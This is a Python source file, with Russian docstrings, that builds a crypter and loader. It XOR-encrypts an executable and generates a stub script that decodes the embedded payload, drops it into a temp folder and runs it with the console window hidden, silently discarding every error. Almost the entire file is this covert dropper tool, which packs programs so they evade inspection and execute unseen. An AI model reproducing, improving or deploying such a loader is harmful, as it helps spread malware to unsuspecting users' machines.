import base64
import secrets
from typing import Tuple, Dict


class CryptorEngine:
    def __init__(self, config: Dict):
        self.algo = config.get('encryption_algo', 'XOR')

    def encrypt(self, data: bytes) -> Tuple[bytes, Dict]:
        """Шифрует данные простым XOR (симметрично)."""
        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)
        full = key + iv
        encrypted = bytes([data[i] ^ full[i % len(full)] for i in range(len(data))])
        meta = {
            'key': base64.b64encode(key).decode('ascii'),
            'iv': base64.b64encode(iv).decode('ascii'),
            'algo': 'xor'
        }
        return encrypted, meta


def generate_loader_code(enc_data: bytes, meta: Dict, original_name: str) -> str:
    """
    Генерирует Python-загрузчик для одного зашифрованного EXE.
    Загрузчик расшифровывает и запускает файл без окна консоли.
    """
    b64_enc = base64.b64encode(enc_data).decode('ascii')
    b64_key = meta['key']
    b64_iv = meta['iv']

    return f'''# -*- coding: utf-8 -*-
import base64
import os
import sys
import tempfile
import subprocess

def decrypt(enc_data_b64, key_b64, iv_b64):
    enc_data = base64.b64decode(enc_data_b64)
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    full = key + iv
    return bytes([enc_data[i] ^ full[i % len(full)] for i in range(len(enc_data))])

def run_hidden(exe_path):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        subprocess.Popen([exe_path], startupinfo=startupinfo, creationflags=0x08000000)
    except:
        try:
            os.startfile(exe_path)
        except:
            pass

def main():
    try:
        payload = decrypt("{b64_enc}", "{b64_key}", "{b64_iv}")
        temp_dir = tempfile.mkdtemp()
        exe_path = os.path.join(temp_dir, "{original_name}")
        with open(exe_path, 'wb') as f:
            f.write(payload)
        run_hidden(exe_path)
    except:
        pass

if __name__ == '__main__':
    main()
'''
